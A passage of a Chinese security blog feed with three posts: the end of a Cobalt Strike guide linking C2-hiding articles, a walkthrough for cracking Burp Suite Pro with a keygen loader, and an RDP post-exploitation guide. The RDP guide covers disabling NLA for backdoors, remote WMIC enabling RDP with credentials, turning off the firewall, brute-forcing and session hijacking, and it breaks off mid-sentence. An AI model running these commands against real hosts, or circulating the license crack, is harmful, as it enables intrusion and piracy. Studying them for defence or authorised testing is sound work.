href="https://github.com/422926799/csplugin">422926799/csplugin: 自己开的cs插件</a>  </li><li><a href="https://github.com/threatexpress/aggressor-scripts/tree/d6bdbd587379d7da2a337d19cccdee1a8628d1d8/beacon_handler">上线进程自动转移</a></li></ul><h1 id="0x05-问题集"><a href="#0x05-问题集" class="headerlink" title="0x05 问题集"></a>0x05 问题集</h1><h2 id="TeamServer-prop"><a href="#TeamServer-prop" class="headerlink" title="TeamServer.prop"></a>TeamServer.prop</h2><p>在 4.4 版本之后，您可能在启动团队服务器时注意到一条警告消息：</p><pre class="line-numbers language-none"><code class="language-none">[!] Properties file (../TeamServer.prop) was not found.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>TeamServer.prop这个文件是可选的，不影响启动。  </p><p>它包含许多可选参数，可用于自定义用于验证屏幕截图和键盘日志回调数据的设置，从而允许您调整<code>HotCobalt</code>漏洞的修复程序。</p><p>可以通过创建一个名为 TeamServer.prop 的空文件并将其保存在 Cobalt Strike 目录中来抑制警告。</p><p>TeamServer.prop 示例文件可以从 Cobalt-Strike/TeamServerProp GitHub 存储库下载在这里。<br>默认 TeamServer.prop 文件包含以下内容：</p><pre class="line-numbers language-none"><code class="language-none">#Cobalt Strike Team Server Properties#Fri May 07 12:00:00 CDT 2021# ------------------------------------------------# Validation for screenshot messages from beacons# ------------------------------------------------# limits.screenshot_validated=true# limits.screenshot_data_maxlen=4194304# limits.screenshot_user_maxlen=1024# limits.screenshot_title_maxlen=1024# Stop writing screenshot data when Disk Usage reaches XX%# Example: Off#          "limits.screenshot_diskused_percent=0"# Example: Stop writing screenshot data when Disk Usage reaches 95%#          "limits.screenshot_diskused_percent=95"# Default:# limits.screenshot_diskused_percent=95# ------------------------------------------------# Validation for keystroke messages from beacons# -----------------------------------------------# limits.keystrokes_validated=true# limits.keystrokes_data_maxlen=8192# limits.keystrokes_user_maxlen=1024# limits.keystrokes_title_maxlen=1024# Stop writing keystroke data when Disk Usage reaches XX%# Example: Off#          "limits.keystrokes_diskused_percent=0"# Example: Stop writing keystroke data when Disk Usage reaches 95%#          "limits.keystrokes_diskused_percent=95"# Default:# limits.keystrokes_diskused_percent=95<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>以<code>#</code>开头的行是注释。</li><li><code>limit.*_data_maxlen</code> 是将被处理的屏幕截图/keylog 数据的最大大小。超过此限制的回调将被拒绝。</li><li><code>limit.*_validated=false</code> 表示忽略以下三个 <code>…_maxlen</code> 设置</li><li>将任何<code>..._maxlen</code> 设置设置为零将禁用该特定设置</li><li><code>limit.*_diskused_percent</code>设置回调处理的阈值。当磁盘使用率超过指定百分比时回调被拒绝。 <code>limit.*_diskused_percent=0（零）</code> 禁用此设置，有效值为 0-99</li></ul><h2 id="WARNING-An-illegal-reflective-access-operation-has-occurred"><a href="#WARNING-An-illegal-reflective-access-operation-has-occurred" class="headerlink" title="WARNING: An illegal reflective access operation has occurred"></a>WARNING: An illegal reflective access operation has occurred</h2><pre class="line-numbers language-none"><code class="language-none">WARNING: An illegal reflective access operation has occurred<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>主要出现在高版本(&gt;=jdk9)情况下，没有影响，忽略就好</p><p>在启动项加个如下命令即可忽略该warning</p><pre class="line-numbers language-none"><code class="language-none">--add-opens=java.base/java.lang.reflect=ALL-UNNAMED<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x06-参考文章"><a href="#0x06-参考文章" class="headerlink" title="0x06 参考文章"></a>0x06 参考文章</h1><p><a href="https://github.com/aleenzz/Cobalt_Strike_wiki">https://github.com/aleenzz/Cobalt_Strike_wiki</a><br><a href="https://github.com/Twi1ight/CSAgent">Twi1ight/CSAgent: CobaltStrike 4.x通用白嫖及汉化加载器</a><br><a href="https://github.com/k8gege/Aggressor/releases">Releases · k8gege/Aggressor</a><br><a href="https://blog.csdn.net/qq_41874930/article/details/109008708">利用CDN、域前置、重定向三种技术隐藏C2的区别</a><br><a href="https://www.jianshu.com/p/e7701efef047">Cobalt Strike 的特征与隐藏 </a><br><a href="https://www.kitsch.live/2021/04/14/c2%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%9A%90%E8%97%8F%E7%9C%9F%E5%AE%9Eip/">C2服务器隐藏真实ip – 梦中世界</a><br><a href="https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/#stager">检测与隐藏Cobaltstrike服务器 - Blog</a><br><a href="https://kosakd.top/2021/05/05/CobaltStrike%E6%95%99%E7%A8%8B/">CobaltStrike特征隐藏</a><br><a href="https://mp.weixin.qq.com/s/K95VOz2m1J6wTUtsktD3gQ">APT级CS隐藏教程：使用反向代理、C2-Profile和CDN拉满溯源难度</a><br><a href="https://52by.cc/cobaltstrikeshang-xian-yin-cang/">CobaltStrike上线隐藏</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具分享 </tag>
            
            <tag> CobaltStrike4.4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows最新版burpsuite安装破解(内置JDK,附下载连接)</title>
      <link href="posts/14150.html"/>
      <url>posts/14150.html</url>
      
        <content type="html"><![CDATA[<h1 id="安装破解"><a href="#安装破解" class="headerlink" title="安装破解"></a>安装破解</h1><p>burp 官网下载地址：<a href="https://portswigger.net/burp/releases">https://portswigger.net/burp/releases</a></p><p>Java 环境9及以上的，在burp官网下载最新的jar格式的burp，  然后按照以下地址的安装破解教程走就好了<br><a href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen">Burp Suite Pro Loader &amp; Keygen ( BurpSuite version v2020.1 - ∞ )</a></p><p>重点来说一下，java 环境 8及以下，并且未安装或者不想安装多java环境的改怎么操作    </p><p>在burp官网下载最新版本burp, 选择windows版下载，自带java环境，无需额外下载。<br>Loader Keygen下载地址：    </p><ul><li><a href="https://github.com/bewhale/BurpLoaderKeygen-Modified">BurpLoaderKeygen-Modified</a></li></ul><p>汉化版下载地址：  </p><ul><li><a href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases/download/2.0/BurpLoaderKeygenCn.jar">BurpLoaderKeygenCn 支持汉化</a>  </li></ul><p>安装Burp Suite  ，然后将BurpLoaderKeygen放入安装目录</p><p>在此目录新建vbs文件<br><code>StartLoaderCn.vbs</code>文件,  用来启动BurpLoaderKeygenCn，内容如下</p><pre class="line-numbers language-vbscript" data-language="vbscript"><code class="language-vbscript">CreateObject("Wscript.Shell").run "cmd /k .\jre\bin\java.exe  -jar BurpLoaderKeygenCn.jar",0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>双击运行StartLoaderCn.vbs，选中CN，即可将burp汉化，</p><p>选中Auto Run，以后打开StartLoader.vbs文件即可直接打开burp(这里也可以默认不动，选择使用后面的启动脚本来启动)</p><p>点击run，启动burp， 第一次使用burpsuite，需要破解，</p><p><img src="https://raw.githubusercontents.com/bewhale/img/master/img20210720233441.png" alt="image-20210720233441008"></p><p>将License复制到burp，点击next，选择manual activation(手动激活)</p><p><img src="https://raw.githubusercontents.com/bewhale/img/master/img20210720233908.png" alt="image-20210720233908094"></p><p>点击 copy requests，粘贴到Loader里面的Activation Request框里面，会自动生成生成Activation Response</p><p>复制Activation Response框里面的内容，到burp，点击Paste response，再点击next即可激活burp。</p><p><img src="https://raw.githubusercontents.com/bewhale/img/master/img20210720235340.png" alt="image-20210720235339943"></p><p><strong>可选</strong></p><p><code>burpsuite.vbs</code>文件，用来启动Burp，内容如下</p><pre class="line-numbers language-vbscript" data-language="vbscript"><code class="language-vbscript">CreateObject("WScript.Shell").Run ".\jre\bin\java.exe --illegal-access=permit -Xmx512m -noverify -javaagent:BurpLoaderKeygen.jar -Dfile.encoding=utf-8 -jar burpsuite_pro.jar",0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>burpsuiteCn.vbs</code>文件，用来启动汉化版Burp，内容如下</p><pre class="line-numbers language-vbscript" data-language="vbscript"><code class="language-vbscript">CreateObject("WScript.Shell").Run ".\jre\bin\java.exe --illegal-access=permit -Xmx512m -noverify -javaagent:BurpLoaderKeygenCn.jar=cn -Dfile.encoding=utf-8 -jar burpsuite_pro.jar",0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="插件推荐"><a href="#插件推荐" class="headerlink" title="插件推荐"></a>插件推荐</h1><ul><li><p>有关burpsuite的插件(非商店),文章以及使用技巧的收集<br><a href="https://github.com/Mr-xn/BurpSuite-collections">https://github.com/Mr-xn/BurpSuite-collections</a>  </p></li><li><p>burp前端加密爆破插件<br><a href="https://github.com/whwlsfb/BurpCrypto">https://github.com/whwlsfb/BurpCrypto</a></p></li><li><p>log4j<br><a href="https://github.com/whwlsfb/Log4j2Scan">https://github.com/whwlsfb/Log4j2Scan</a><br><a href="https://github.com/f0ng/log4j2burpscanner">https://github.com/f0ng/log4j2burpscanner</a>  </p></li><li><p>shiro被动扫描<br><a href="https://github.com/pmiaowu/BurpShiroPassiveScan/">https://github.com/pmiaowu/BurpShiroPassiveScan/</a></p></li><li><p>captcha-killer要解决的问题是让burp能用上各种验证码识别技术<br><a href="https://github.com/ffffffff0x/BerylEnigma">https://github.com/ffffffff0x/BerylEnigma</a></p></li><li><p>domain_hunter的高级版本，SRC挖洞、HW打点之必备！自动化资产收集；快速Title获取；外部工具联动；等等<br><a href="https://github.com/bit4woo/domain_hunter_pro">https://github.com/bit4woo/domain_hunter_pro</a></p></li><li><p>A burp extension that add some useful function to Context Menu 添加一些右键菜单让burp用起来更顺畅<br><a href="https://github.com/bit4woo/knife">https://github.com/bit4woo/knife</a>  </p></li><li><p>Burpsuite-Plugins-Usage<br><a href="https://github.com/lilifengcode/Burpsuite-Plugins-Usage">https://github.com/lilifengcode/Burpsuite-Plugins-Usage</a></p></li><li><p>BurpSuite_403Bypasser<br><a href="https://github.com/sting8k/BurpSuite_403Bypasser">https://github.com/sting8k/BurpSuite_403Bypasser</a><br><a href="https://github.com/p0desta/AutoBypass403-BurpSuite">https://github.com/p0desta/AutoBypass403-BurpSuite</a></p></li><li><p> http-request-smuggler-all.jar  —HTTP走私攻击检查插件   商店可以安装<br><a href="https://github.com/PortSwigger/http-request-smuggler">https://github.com/PortSwigger/http-request-smuggler</a></p></li><li><p>HaE是基于 BurpSuite 插件 JavaAPI 开发的请求高亮标记与信息提取的辅助型插件。<br><a href="https://github.com/gh0stkey/HaE">https://github.com/gh0stkey/HaE</a></p></li><li><p>PSC-DF-1.2 Burp被动流量转发插件优化版感谢您的支持<br><a href="https://github.com/winezer0/passive-scan-client-plus">https://github.com/winezer0/passive-scan-client-plus</a></p></li><li><p>burp-wildcard-plus 支持burp2020.11.2及后续的版本主题的bp标签管理工具<br><a href="https://github.com/winezer0/burp-wildcard-plus">https://github.com/winezer0/burp-wildcard-plus</a></p></li><li><p>xray4burp  使用xray自带的raw-request命令，直接扫描burp的原始报文。<br><a href="https://github.com/winezer0/xray4burp">https://github.com/winezer0/xray4burp</a></p></li><li><p>copy-as-any-script  导出burp请求报文为其他语言脚本<br><a href="https://github.com/winezer0/copy-as-any-script">https://github.com/winezer0/copy-as-any-script</a></p></li><li><p>winezer0/burp-random-header 用于实现请求头的动态修改burp插件 。<br><a href="https://github.com/winezer0/burp-random-header-plus">https://github.com/winezer0/burp-random-header-plus</a></p></li><li><p>c0ny1/chunked-coding-converter: Burp suite 分块传输辅助插件<br><a href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p></li></ul><h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><pre class="line-numbers language-none"><code class="language-none"># Linux Bp激活信息保存位置~/.java/.userPrefs/burp# Linux Bp配置文件位置~/.BurpSuite# Windows Bp激活信息保存位置注册表：HKEY_CURRENT_USER\Software\JavaSoft\Prefs\burp# Windows Bp配置文件位置C:\Users\%username%\AppData\Roaming\BurpSuite<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.bilibili.com/read/cv11712279?share_source=weixin&amp;share_medium=android&amp;bbid=C0A7B1D7-C692-6318-B9DB-F517FEB3E59389014infoc&amp;ts=1626759688658">Burp Suite Professional 2021.6.1安装注册 - 哔哩哔哩</a></p><p><a href="https://github.com/TrojanAZhen/BurpSuitePro-2.1">TrojanAZhen/BurpSuitePro-2.1: 什么? 你想用免费的BurpSuitePro版本!!!</a></p><p><a href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen">h3110w0r1d-y/BurpLoaderKeygen: Burp Suite Pro Loader &amp; Keygen ( BurpSuite version v2020.1 - ∞ )</a></p><p><a href="https://github.com/Prodject/BurpSuite-collections">https://github.com/Prodject/BurpSuite-collections</a></p><p><a href="https://github.com/funkyoummp/BurpSuiteCn">funkyoummp/BurpSuiteCn: Burp Suite 汉化 中文</a></p><p><a href="https://mp.weixin.qq.com/s/NJ2Uwy2GRvsG6gamlmsf-w">一些相见恨晚的BurpSuite插件推荐</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具分享 </tag>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RDP安全总结</title>
      <link href="posts/24991.html"/>
      <url>posts/24991.html</url>
      
        <content type="html"><![CDATA[<h1 id="一、RDP-介绍"><a href="#一、RDP-介绍" class="headerlink" title="一、RDP 介绍"></a>一、RDP 介绍</h1><hr><blockquote><p>RDP，Remote Desktop Protocol，远程桌面协议，该协议是对国际电信联盟发布的一个国际标准的多通道会议协议 T.120 的一个扩展。远程桌面协议让用户（客户端或称 “本地电脑”）连上提供微软终端机服务的电脑（服务器端或称 “远程电脑”）。大部分的 Windows、Linux、FreeBSD、Mac OS X 都有相应的客户端。远程桌面协议在服务端默认监听 TCP 3389 端口的数据。远程桌面协议为用户提供了通过网络连接远程登录到另一台计算机的图形界面。</p></blockquote><h2 id="userauthentication鉴权"><a href="#userauthentication鉴权" class="headerlink" title="userauthentication鉴权"></a>userauthentication鉴权</h2><p>那我们在实战中，需要了解另一个权限，userauthentication 权限 ，该权限主要是用于设置远程连接的身份验证，称之为鉴权</p><p>详情见：<a href="https://docs.microsoft.com/zh-cn/windows-hardware/customize/desktop/unattend/microsoft-windows-terminalservices-rdp-winstationextensions-userauthentication">UserAuthentication | Microsoft Docs</a></p><pre class="line-numbers language-none"><code class="language-none">0   指定的网络级用户不需要身份验证就能建立远程桌面连接。 这是默认值。1   指定网络级别的用户身份验证是必需的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们采用如下命令来开启或者关闭鉴权，这里 0 代表关闭，1 代表开启：</p><pre class="line-numbers language-none"><code class="language-none">REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>关于网络级身份验证(NLA)</strong></p><p>所谓网络级验证（network level authentication NLA）是提供给远程桌面连接的一种新安全验证机制，可以在终端桌面连接及<strong>登录画面出现前</strong>预先完成用户验证程序，由于提前验证部分仅需要使用到较少的网络资源，因此可以有效防范黑客与恶意程序的攻击，同时降低阻断服务攻击(Dos)的机会。</p><p>网络级身份验证有以下优点：</p><ul><li>开始时它只需要很少的远程计算机资源，因为在验证用户身份之前，远程计算机只使用有限的资源，密码验证通过后才进入远程桌面。在早期版本中，远程计算机会启动完全的远程桌面连接。</li><li>它可以通过降低拒绝服务攻击（拒绝服务攻击试图限制或阻止访问 Internet）的风险来帮助提高安全性。</li><li>它采用远程计算机身份验证。这有助于防止用户连接到出于恶意目的而建立的远程计算机。</li></ul><h2 id="securitylayer-安全层验证"><a href="#securitylayer-安全层验证" class="headerlink" title="securitylayer 安全层验证"></a>securitylayer 安全层验证</h2><blockquote><p>securitylayer 指定服务器和客户端如何彼此进行身份验证之前建立的远程桌面连接。这个安全层验证简单来说就是保证了对话传输保密性更高，它的默认值为 1，指定在建立远程桌面连接之前，服务器和客户端需要进行身份验证，如果这个地方安全层验证的默认值为 1，服务器和客户端就必须要进行身份验证，也就是输入帐号密码的操作。</p></blockquote><p>详情见：<a href="https://docs.microsoft.com/zh-cn/windows-hardware/customize/desktop/unattend/microsoft-windows-terminalservices-rdp-winstationextensions-securitylayer">SecurityLayer | Microsoft Docs</a></p><pre class="line-numbers language-none"><code class="language-none">0 就是连接前使用 rdp 协议进行身份验证，rdp 即远程桌面连接，可以简单理解为就是关闭验证。1 是指在连接前两端协商来进行身份验证，这个是默认值。2 就是使用 tls 协议来进行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用如下命令来进行修改</p><pre class="line-numbers language-none"><code class="language-none">REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="出现身份验证错误-报错解决"><a href="#出现身份验证错误-报错解决" class="headerlink" title="出现身份验证错误 报错解决"></a>出现身份验证错误 报错解决</h2><pre class="line-numbers language-none"><code class="language-none">出现身份验证错误，要求的函数不受支持，远程计算机：X.X.X.X，这可能是由于CredSSP加密Oracle修正<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>方法一</strong></p><p>这就需要<strong>被连接端</strong>关闭鉴权模式，在<strong>被连接端</strong>使用上述reg命令关闭鉴权</p><p>或者在远程桌面连接设置里面，取消 “仅允许运行使用网络级别身份验证的远程桌面的计算机连接” 这一安全设置，  </p><p>选择运行任意版本远程桌面的计算机连接即可。  </p><p><strong>方法二</strong></p><p>在<strong>控制端</strong>, win+r，输入regedit，点击确定，打开注册表编辑器；<br>找到路径：</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters</p><p>后两项没有时手动建立，右键左侧目录System，选择“新建——项”，输入文件夹名</p><p>在Parameters 里 新建 DWORD（32位），名称：“AllowEncryptionOracle”，值：2</p><p>再次连接远程计算机，失败则重启。</p><h2 id="进入远程桌面登录用户"><a href="#进入远程桌面登录用户" class="headerlink" title="进入远程桌面登录用户"></a>进入远程桌面登录用户</h2><p>我在测试过程中，需要同时关闭 <code>userauthentication</code> 和 <code>securitylayer </code></p><p>才可以不用输入凭证 进入 3389 的登录页面 来登录远程桌面。</p><p>可以用来留shift后门之类的。</p><h1 id="二、查询3389端口方式"><a href="#二、查询3389端口方式" class="headerlink" title="二、查询3389端口方式"></a>二、查询3389端口方式</h1><p><a href="https://mp.weixin.qq.com/s/hgGcoEghsW0IIh7r-YCKCg">查询和开启3389端口方式总结</a></p><h2 id="1-REG查询3389状态（0：ON、1：OFF）"><a href="#1-REG查询3389状态（0：ON、1：OFF）" class="headerlink" title="(1) REG查询3389状态（0：ON、1：OFF）"></a>(1) REG查询3389状态（0：ON、1：OFF）</h2><pre class="line-numbers language-none"><code class="language-none">REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-REG查询3389端口（16进制-gt-10进制）"><a href="#2-REG查询3389端口（16进制-gt-10进制）" class="headerlink" title="(2) REG查询3389端口（16进制->10进制）"></a>(2) REG查询3389端口（16进制-&gt;10进制）</h2><pre class="line-numbers language-none"><code class="language-none">REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds" /sREG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumberset /a Port=0xd3d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-tasklist、netstat命令查询3389端口"><a href="#3-tasklist、netstat命令查询3389端口" class="headerlink" title="(3) tasklist、netstat命令查询3389端口"></a>(3) tasklist、netstat命令查询3389端口</h2><pre class="line-numbers language-none"><code class="language-none">tasklist /svc | findstr "TermService"netstat -ano | findstr "2028"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>注：有时也会遇到特殊情况，如某虚拟主机自建低权限用户运行的IIS（Users、IIS_IUSRS），tasklist /svc不显示服务名，注册表查看是0xd3d，但netstat -ano里又没有3389端口，这可能是因为3389远程终端被关闭了，Users权限下只能根据个人经验盲猜可疑端口号。</p></blockquote><h2 id="4-Meterpreter的netstat查询3389端口"><a href="#4-Meterpreter的netstat查询3389端口" class="headerlink" title="(4) Meterpreter的netstat查询3389端口"></a>(4) Meterpreter的netstat查询3389端口</h2><p>有时我们会遇到不能执行netstat、tasklist和reg等命令的情况，<br>这时可以通过Meterpreter下的netstat命令来快速查询3389端口，先找0.0.0.0运行的svchost.exe，然后根据个人经验盲猜可疑端口号。  </p><h2 id="5-端口扫描"><a href="#5-端口扫描" class="headerlink" title="(5) 端口扫描"></a>(5) 端口扫描</h2><p>可以借助 Nmap 扫描来验证端口 3389 是否被打开</p><pre class="line-numbers language-none"><code class="language-none">nmap -sV -sC -p 3389 192.168.93.30<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="三、开启3389端口方式"><a href="#三、开启3389端口方式" class="headerlink" title="三、开启3389端口方式"></a>三、开启3389端口方式</h1><h2 id="1-MSF命令开启3389端口"><a href="#1-MSF命令开启3389端口" class="headerlink" title="(1) MSF命令开启3389端口"></a>(1) MSF命令开启3389端口</h2><p>支持系统：<br>XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run post/windows/manage/enable_rdpmeterpreter &gt; run getgui -e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>注：getgui可用于开启目标机器的3389远程桌面端口、创建管理员账户密码、禁用远程桌面(TCP-In)防火墙入站规则等。</p></blockquote><h2 id="2-REG命令开启3389端口"><a href="#2-REG命令开启3389端口" class="headerlink" title="(2) REG命令开启3389端口"></a>(2) REG命令开启3389端口</h2><p>支持系统：<br>XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016（0：ON、1：OFF）</p><pre class="line-numbers language-none"><code class="language-none">// 开启远程桌面REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f// 修改windows远程桌面端口3389为3000(一般情况不要改)REG ADD "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "PortNumber" /t REG_DWORD /d 3000 /f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-WMIC命令开启3389端口"><a href="#3-WMIC命令开启3389端口" class="headerlink" title="(3) WMIC命令开启3389端口"></a>(3) WMIC命令开启3389端口</h2><p>支持系统：<br>Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016（1：ON、0：OFF）</p><pre class="line-numbers language-none"><code class="language-none">wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1# 前提条件是确保“Windows Management Instrumentation（Winmgmt）”服务已正常启动。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4-WMIC开启远程主机3389端口"><a href="#4-WMIC开启远程主机3389端口" class="headerlink" title="(4) WMIC开启远程主机3389端口"></a>(4) WMIC开启远程主机3389端口</h2><p>支持系统：<br>Win2k/XP/Win2k3</p><pre class="line-numbers language-none"><code class="language-none">// wmic /node:"[full machine name]" /USER:"[domain]\[username]" PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1wmic /node:192.168.0.103 /user:administrator /password:betasec PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>支持系统：<br>Win7/Win2k8/Win8.1/Win10/2012/2016</p><pre class="line-numbers language-none"><code class="language-none">wmic /node:192.168.0.116 /user:administrator /password:betasec RDTOGGLE WHERE ServerName='WIN-TO2CN3V2VPR' call SetAllowTSConnections 1wmic /node:192.168.0.116 /user:administrator /password:betasec process call create 'cmd.exe /c REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>注意事项：<br>其实就是利用WMIC远程执行命令的方式来执行WMIC、REG等开启3389端口的命令。<br>WMIC远程开启3389端口时不能用%COMPUTERNAME%环境变量替代远程主机的计算机名。<br>错误：描述 = 拒绝访问，这是因为开启了UAC用户账户控制，只允许RID500管理员执行此操作。</p></blockquote><h2 id="5-Windows-API开启3389端口"><a href="#5-Windows-API开启3389端口" class="headerlink" title="(5) Windows API开启3389端口"></a>(5) Windows API开启3389端口</h2><p>冷逸老哥用C++写的“开3389工具”有点小问题，在两台Windows2008机器上测试时分别报出缺少vcruntime140.dll、api-ms-win-crt-runtime-l1-1-0.dll，可以自己去调试编译下。</p><p>根据@冷逸老哥的思路用C#也写了一个，目标框架：.NET Framework 2.0，可用CobaltStrike execute-assembly加载到内存中实现无落地执行，<br>其工具原理就是利用RegCreateKeyEx和RegSetValueEx两个API和Microsoft.Win32 RegistryKey类操作系统注册表，与无Net.exe添加管理员用户一样，都是直接利用Windows API执行相应操作！！！</p><p><a href="https://github.com/3had0w/Open3389">https://github.com/3had0w/Open3389</a></p><p>应用场景-1：<br>目标主机因存在某安全防护软件而无法用reg、wmic命令开启3389端口时，可以尝试使用这款工具来查询和开启3389端口，可用execute-assembly加载到内存中执行。</p><p>应用场景-2：<br>目标主机因存在某安全防护软件（如：某锁、某安全卫士）在拦截rundll32.exe时则不能用execute-assembly加载到内存中执行，所以只能选择落地执行，目前为止还是免杀的。</p><h2 id="6-MSSQL-xp-regwrite开启3389端口"><a href="#6-MSSQL-xp-regwrite开启3389端口" class="headerlink" title="(6) MSSQL xp_regwrite开启3389端口"></a>(6) MSSQL xp_regwrite开启3389端口</h2><p>应用场景：xp_cmdshell被禁用/删除且无法恢复时，可尝试用xp_regread、xp_regwrite来查询和开启目标机器3389端口，也可以选择用sp_OACreate、Agent Job等其他命令执行方式。</p><pre class="line-numbers language-none"><code class="language-none"># 1、查询3389开启状态exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server' ,'fDenyTSConnections'# 2、查询3389远程桌面端口exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp','PortNumber' # 3、开启3389远程桌面端口（0：ON、1：OFF）exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="四、防火墙配置"><a href="#四、防火墙配置" class="headerlink" title="四、防火墙配置"></a>四、防火墙配置</h1><pre class="line-numbers language-none"><code class="language-none">// 配置一下防火墙，设置为允许远程桌面连接，命令：netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow// netsh 是 windows 的网络配置命令，advfirewall firewall 意思为防火墙的高级设置，add rule 是添加一条规则// name 指定规则名称，protocol 指定协议，dir 指定是出站还是入站，localport 指定端口，action 指定动作 allow 允许// 关闭防火墙netsh firewall set opmode mode=disable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="五、RDP连接工具"><a href="#五、RDP连接工具" class="headerlink" title="五、RDP连接工具"></a>五、RDP连接工具</h1><p>开启目标主机的远程桌面后，我们便可以对目标主机进行连接了：</p><ul><li><strong>Linux 系统上的可以使用 rdesktop：</strong></li></ul><pre class="line-numbers language-none"><code class="language-none">redesktop 192.168.93.30  # redesktop IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>Windows 系统上可以使用 mstsc.exe</strong></li></ul><h1 id="六、暴力破解RDP口令"><a href="#六、暴力破解RDP口令" class="headerlink" title="六、暴力破解RDP口令"></a>六、暴力破解RDP口令</h1><p>在实战中，攻击者可以借助 Nmap 来扫描目标主机 3389 端口是否开启，如果目标主机开启了 3389 端口，那我们便可以对目标主机的远程桌面登录口令进行暴力猜解。</p><p>可以使用超级弱口令检查工具和Hydra之类的工具</p><p>下载地址：<a href="https://github.com/shack2/SNETCracker/releases">shack2/SNETCracker</a></p><h1 id="七、RDP劫持"><a href="#七、RDP劫持" class="headerlink" title="七、RDP劫持"></a>七、RDP劫持</h1><p>在 Windows 中有一个 tscon 命令行下使用的工具</p><p>首先执行如下命令获取用户对应的会话 ID：</p><pre class="line-numbers language-none"><code class="language-none">query user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到用户对应的会话 ID，然后通过执行 tscon 